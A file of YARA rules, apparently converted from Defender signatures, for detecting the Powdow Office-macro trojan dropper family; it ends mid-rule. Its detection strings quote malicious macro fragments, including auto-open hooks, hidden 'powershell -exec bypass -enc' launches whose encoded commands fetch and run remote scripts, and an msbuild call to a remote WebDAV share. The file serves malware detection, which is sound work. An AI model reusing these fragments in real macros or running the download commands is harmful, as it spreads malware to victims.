rule TrojanDropper_O97M_Powdow_2147745764_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow!MTB"
        threat_id = "2147745764"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Finert = Replace(Roolg, \".ooo\", \".\" & Oilop & \"j\" & Oilop & \"se\")" ascii //weight: 1
        $x_1_2 = "CallByName Nedocore(wdWord9TableBehavior, Nibcv & \"ri\" & Oilop & \"pt.\" & Doervc), Rdazzok, " ascii //weight: 1
        $x_1_3 = "VbMethod, \"\"\"\" & Finert & \"\"\"\" & \" \" & \"______\" & wdWord9TableBehavior, 1" ascii //weight: 1
        $x_1_4 = "= ActiveDocument.Content.Text" ascii //weight: 1
        $x_1_5 = {50 75 74 20 23 [0-8] 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_AJ_2147745809_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.AJ!MTB"
        threat_id = "2147745809"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 22 20 26 20 [0-18] 20 26 20 45 6d 70 74 79 20 26 20 22 5c [0-20] 22 20 26 20 45 6d 70 74 79 20 26 20 22 2e 6a 22 20 26 20 45 6d 70 74 79 20 26 20 22 73 22 20 26 20 22 22 20 26 20 22 65 22 20 26 20 45 6d 70 74 79}  //weight: 1, accuracy: Low
        $x_1_2 = "Print #Ntooker," ascii //weight: 1
        $x_1_3 = "ReplaceWith:=\"\"" ascii //weight: 1
        $x_1_4 = "ActiveDocument.content.Text = \"\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_AK_2147745874_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.AK!MTB"
        threat_id = "2147745874"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 22 20 26 20 [0-18] 20 26 20 45 6d 70 74 79 20 26 20 22 5c [0-18] 22 20 26 20 [0-18] 20 26 20 22 6a 22 20 26 20 45 6d 70 74 79 20 26 20 22 73 22 20 26 20 22 22 20 26 20 22 65 22 20 26 20 45 6d 70 74 79}  //weight: 1, accuracy: Low
        $x_1_2 = {50 72 69 6e 74 20 23 [0-8] 2c 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2e 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = {26 20 45 6d 70 74 79 [0-24] 20 26 20 22 [0-2] 22 2c 20 56 62 4d 65 74 68 6f 64 2c 20 5f}  //weight: 1, accuracy: Low
        $x_1_4 = "ActiveDocument.Content.Text = \"\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_AL_2147746106_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.AL!MTB"
        threat_id = "2147746106"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 22 20 26 20 [0-18] 20 26 20 45 6d 70 74 79 20 26 20 22 5c [0-22] 2e 22 20 26 20 [0-18] 20 26 20 22 4a 22 20 26 20 [0-18] 20 26 20 22 73 22 20 26 20 22 22 20 26 20 22 65 22 20 26}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 22 22 20 26 20 [0-18] 20 26 20 45 6d 70 74 79 20 26 20 22 5c [0-22] 2e 22 20 26 20 [0-18] 20 26 20 22 6a 22 20 26 20 [0-18] 20 26 20 22 73 22 20 26 20 22 22 20 26 20 22 65 22 20 26}  //weight: 1, accuracy: Low
        $x_1_3 = "n\", VbMethod, _" ascii //weight: 1
        $x_1_4 = {50 72 69 6e 74 20 23 [0-18] 2c}  //weight: 1, accuracy: Low
        $x_1_5 = "ActiveDocument.Content.Text = \"\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDropper_O97M_Powdow_AM_2147747986_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.AM!MTB"
        threat_id = "2147747986"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"W\" & \"\" & \"S\" & \"c\"" ascii //weight: 1
        $x_1_2 = {3d 20 52 65 70 6c 61 63 65 28 [0-16] 2c 20 22 2e 74 78 74 22 2c 20 22 2e 4a 22 20 26 20 [0-21] 20 26 20 22 73 65 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-16] 2c 20 22 2e 74 78 74 22 2c 20 22 2e 6a 22 20 26 20 [0-21] 20 26 20 22 73 65 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 22 22 20 26 20 [0-24] 20 26 20 45 6d 70 74 79 20 26 20 22 5c [0-16] 2e 22 20 26}  //weight: 1, accuracy: Low
        $x_1_5 = {50 75 74 20 23 [0-24] 2c 20 2c 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2e 54 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDropper_O97M_Powdow_AN_2147748063_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.AN!MTB"
        threat_id = "2147748063"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "#If VBA7 Then" ascii //weight: 1
        $x_1_2 = "Public Declare PtrSafe Function GetMessageExtraInfo Lib \"user32\" () As LongPtr" ascii //weight: 1
        $x_1_3 = "ShellWait = lExitCode" ascii //weight: 1
        $x_1_4 = "sCommandLine = \"\"\"\" & sFile & \"\"\"\" & \" \" & sParams" ascii //weight: 1
        $x_1_5 = {50 72 69 6e 74 20 23 ?? 2c 20 43 53 74 72 28 [0-21] 2e [0-21] 2e 43 61 70 74 69 6f 6e 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_AT_2147748144_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.AT!MTB"
        threat_id = "2147748144"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 57 22 20 26 20 [0-21] 20 26 20 22 53 22 20 26 20 [0-21] 20 26 20 22 63 22}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 52 65 70 6c 61 63 65 28 [0-16] 2c 20 22 2e 74 78 74 22 2c 20 22 2e 6a 22 20 26 20 [0-16] 20 26 20 22 73 65 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {50 75 74 20 23 [0-24] 2c 20 2c 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2e 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 22 22 20 26 20 [0-24] 20 26 20 45 6d 70 74 79 20 26 20 22 5c [0-16] 2e 22 20 26}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_AU_2147748471_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.AU!MTB"
        threat_id = "2147748471"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "& Chr(34) & \" \" &" ascii //weight: 1
        $x_1_2 = {3d 20 52 65 70 6c 61 63 65 28 [0-16] 2c 20 22 2e [0-8] 22 2c 20 22 2e 22 20 26 20 [0-16] 20 26 20 22 6a 73 22 20 26 20 [0-16] 20 26 20 22 65 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {50 75 74 20 23 [0-24] 2c 20 2c 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2e 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 22 22 20 26 20 [0-24] 20 26 20 45 6d 70 74 79 20 26 20 22 5c [0-16] 2e 22 20 26}  //weight: 1, accuracy: Low
        $x_1_5 = "& \"Run\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_AV_2147748541_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.AV!MTB"
        threat_id = "2147748541"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\".jse\"" ascii //weight: 1
        $x_1_2 = "& \".doc\"" ascii //weight: 1
        $x_1_3 = "= Environ(\"APPDATA\")" ascii //weight: 1
        $x_1_4 = "& \"\\\" & Rnd &" ascii //weight: 1
        $x_1_5 = "= ActiveDocument.Shapes(1).TextFrame.TextRange" ascii //weight: 1
        $x_1_6 = {2e 4e 65 78 74 [0-8] 4e 65 78 74 20 69}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_AW_2147748586_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.AW!MTB"
        threat_id = "2147748586"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "& \".jse\"" ascii //weight: 1
        $x_1_2 = "& \".doc\"" ascii //weight: 1
        $x_1_3 = "Environ(\"APPDATA\")" ascii //weight: 1
        $x_1_4 = "& \"\\\"" ascii //weight: 1
        $x_1_5 = "= Mid(collectData.Text, 1, Len(collectData.Text) - 2)" ascii //weight: 1
        $x_1_6 = {50 72 69 6e 74 20 23 [0-2] 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_AX_2147748587_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.AX!MTB"
        threat_id = "2147748587"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "& \".jse\"" ascii //weight: 1
        $x_1_2 = "CreateObject(Mid(AskUser.cmd.Caption, 9, 17)).ShellExecute AskUser.path.Caption" ascii //weight: 1
        $x_1_3 = "Environ(\"TEMP\") & \"\\\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_ARJ_2147749488_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.ARJ!MTB"
        threat_id = "2147749488"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 52 65 70 6c 61 63 65 28 [0-32] 2c 20 22 2e 22 20 26 20 [0-16] 20 26 20 22 6a 22 20 26 20 [0-16] 20 26 20 22 73 65 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {56 62 4d 65 74 68 6f 64 2c 20 22 22 22 22 20 26 20 [0-16] 20 26 20 22 22 22 22 20 26 20 22 20 22 20 26}  //weight: 1, accuracy: Low
        $x_1_3 = {4d 73 67 42 6f 78 20 22 22 20 26 20 [0-16] 20 26 20 22 22 20 26 20 76 62 43 72 4c 66 20 26 20 5f}  //weight: 1, accuracy: Low
        $x_1_4 = {50 75 74 20 [0-32] 2c 20 2c 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2e 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_5 = "ActiveDocument.Close" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_ATK_2147749729_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.ATK!MTB"
        threat_id = "2147749729"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "& \".jse\"" ascii //weight: 1
        $x_1_2 = "= Environ(\"TEMP\") & \"\\\"" ascii //weight: 1
        $x_1_3 = "CreateObject(Mid(Memory.cmd.Caption," ascii //weight: 1
        $x_1_4 = "Temp = Mid(Temp, InStr(Temp, \"\\\")" ascii //weight: 1
        $x_1_5 = {50 72 69 6e 74 20 23 [0-2] 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_LLB_2147749731_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.LLB!MTB"
        threat_id = "2147749731"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\"js\"" ascii //weight: 1
        $x_1_2 = "& \"e\")" ascii //weight: 1
        $x_1_3 = {44 65 62 75 67 2e 50 72 69 6e 74 20 43 61 6c 6c 42 79 4e 61 6d 65 28 [0-21] 2c 20 [0-21] 2c 20 56 62 4d 65 74 68 6f 64 2c 20 [0-21] 20 26 20 43 68 72 28 [0-16] 29 20 26 20 [0-21] 20 26 20 [0-21] 20 26 20 43 68 72 28 [0-16] 29 20 26 20 22 20 22 20 26}  //weight: 1, accuracy: Low
        $x_1_4 = "ThisWorkbook.Sheets.Add" ascii //weight: 1
        $x_1_5 = ".Value = VBA.Array(\"#\", \"Sheet\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_RSA_2147762192_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.RSA!MTB"
        threat_id = "2147762192"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell (\"C:\\\\Windows\\\\System32\\\\cmd.exe /c powershell -encodedcommand" ascii //weight: 1
        $x_1_2 = "SQBFAFgAKABpAHcAcgAgAGgAdAB0AHAAOgAvAC8AYQByAGMAYQBuAHUAcwAtAGIAbABvAG8AbQBzAC4AbQBsADoAOQAwADAAMQAvAEQAcgBvAHAAcABlAHIALgBwAHMAMQAgACkACgA=" ascii //weight: 1
        $x_1_3 = "Sub Auto_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_RSB_2147762267_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.RSB!MTB"
        threat_id = "2147762267"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell.exe -exec bypass -enc" ascii //weight: 1
        $x_1_2 = "KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACIAaAB0AHQAcABzADoALwAvAHAAYQBzAHQAZQBiAGkAbgAuAGMAbwBtAC8AcgBhAHcALwByAGcAZAAyADMAdgB3ADkAIgAsACIAYwBsAGUAYQBuAC4AYgBpAG4AIgApA" ascii //weight: 1
        $x_1_3 = "Shell (exec)" ascii //weight: 1
        $x_1_4 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_RSD_2147763100_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.RSD!MTB"
        threat_id = "2147763100"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell.exe -ep bypass -noni -nop -w hidden -enc" ascii //weight: 1
        $x_1_2 = "oACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBjAHIAYQB6AHkAcgBvAGMAawBpAG4AcwB1AHMAaABpAC8AUABvAEMALwBtAGEAcwB0AGUAcgAvAHAAbwBjAC4AcABzADEAPwAnACkA" ascii //weight: 1
        $x_1_3 = "Shell cmd, 0" ascii //weight: 1
        $x_1_4 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_RSC_2147763511_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.RSC!MTB"
        threat_id = "2147763511"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub Workbook_Open()" ascii //weight: 1
        $x_1_2 = {6d 73 62 75 69 6c 64 2e 65 78 65 20 [0-4] 32 30 34 2e 34 38 2e 32 31 2e 32 33 36 [0-2] 77 65 62 64 61 76 [0-2] 6d 73 62 75 69 6c 64 2e 78 6d 6c}  //weight: 1, accuracy: Low
        $x_1_3 = {54 61 73 6b 49 44 20 3d 20 53 68 65 6c 6c 28 50 72 6f 67 72 61 6d 2c 20 ?? 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_TRK_2147766063_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.TRK!MTB"
        threat_id = "2147766063"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Private Declare Function CloseThemeData Lib \"uxtheme.dll\" (ByVal hTheme As Long) As Long" ascii //weight: 1
        $x_1_2 = "RegularExpressions.CreateTextFile VBA.Environ(\"TEMP\") & \"\\ExcelVBA.vbs\"" ascii //weight: 1
        $x_1_3 = "Set p = RegularExpressions.OpenTextFile(VBA.Environ(\"TEMP\") & \"\\ExcelVBA.vbs\", 8, 1)" ascii //weight: 1
        $x_1_4 = {70 2e 57 72 69 74 65 4c 69 6e 65 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 52 61 6e 67 65 02 00 70 2e 57 72 69 74 65 4c 69 6e 65 20 28 22 27}  //weight: 1, accuracy: Low
        $x_1_5 = "errReturn = objinstance.Create(\"explorer.exe \" & VBA.Environ(\"TEMP\") & \"\\ExcelVBA.vbs\", Null, objConfig, intProcessID)" ascii //weight: 1
        $x_1_6 = "TMPpathFName = TempPathName + \"\\~ConvIconToBmp.tmp\"" ascii //weight: 1
        $x_1_7 = "Call APILine(UserControl.ScaleWidth - m_btnRect.Right + m_btnRect.left + tmpC1, tmpC3 + tmpC2," ascii //weight: 1
        $x_1_8 = ".Red = Val(\"&H\" & Hex$(RGBColor.Red) & \"00\")" ascii //weight: 1
        $x_1_9 = "TempPathName = left$(strTemp, InStr(strTemp, Chr$(0)) - 1)" ascii //weight: 1
        $x_1_10 = "= objService.Get(Chr$(87) & Chr$(105) & Chr$(110) & Chr$(51) & Chr$(50) & Chr$(95) & Chr$(80) _" ascii //weight: 1
        $x_1_11 = "Private Const Version As String = \"SComboBox 1.0.3 By HACKPRO TM\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_JSE_2147768480_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.JSE!MTB"
        threat_id = "2147768480"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Path = \"c:\\Users\\Public\" & Empty & \"\\Videos\\\" & \"tj90\" & Empty & \".j\" & \"se\"" ascii //weight: 1
        $x_1_2 = "Print #FileNumber, Me.TextBox1.Value + \"    \"" ascii //weight: 1
        $x_1_3 = "ThisWorkbook.BuiltinDocumentProperties(\"Author\") = Replace(\"wonsconriponton.onshonellon\", \"on\", \"\")" ascii //weight: 1
        $x_1_4 = "ll = ll & \".rest/wp-\" & Empty & Empty & \"\" & \"info.p\"" ascii //weight: 1
        $x_1_5 = "ll = ll & \"//sherpa\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_MK_2147782175_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.MK!MTB"
        threat_id = "2147782175"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {63 6d 64 2f 63 66 69 6e 64 73 74 72 2f 62 22 22 70 6f 77 65 72 73 68 65 6c 6c 22 22 22 22 22 26 61 63 74 69 76 65 64 6f 63 75 6d 65 6e 74 2e 66 75 6c 6c 6e 61 6d 65 26 22 22 22 3e 25 61 70 70 64 61 74 61 25 5c [0-5] 2e 62 61 74 26 26 63 64 2f 64 25 61 70 70 64 61 74 61 25 26 26 00 2e 62 61 74 22}  //weight: 1, accuracy: Low
        $x_1_2 = {73 68 65 6c 6c 28 [0-5] 76 62 68 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BZLD_2147792981_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BZLD!MTB"
        threat_id = "2147792981"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 22 [0-32] 22 02 00 53 75 62 20 69 6e 69 74 28 [0-16] 2c 20 [0-32] 29 02 00 4f 70 65 6e 20 [0-32] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31 02 00 50 72 69 6e 74 20 23 31 2c 20 [0-32] 43 6c 6f 73 65 20 23 31 [0-48] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {53 65 74 20 [0-32] 20 3d 20 4e 65 77 20 57 73 68 53 68 65 6c 6c [0-32] 2e 65 78 65 63 20 22 63 6d 64 20 2f 63 20 22 20 2b 20 [0-32] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = {53 75 62 20 64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 02 00 69 6e 69 74 20 22 63 3a 5c 70 72 6f 67 72 61 6d 64 61 74 61 5c 31 2e 68 74 61 22 2c 20 52 65 70 6c 61 63 65 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2c 20 22 [0-8] 22 2c 20 22 22 29 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDropper_O97M_Powdow_BZLE_2147792982_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDropper:O97M/Powdow.BZLE!MTB"
        threat_id = "2147792982"
        type = "TrojanDropper"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 22 [0-32] 22 02 00 53 75 62 20 69 6e 69 74 28 [0-16] 2c 20 [0-32] 29 02 00 4f 70 65 6e 20 [0-32] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31 02 00 50 72 69 6e 74 20 23 31 2c 20 [0-32] 43 6c 6f 73 65 20 23 31 [0-48] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
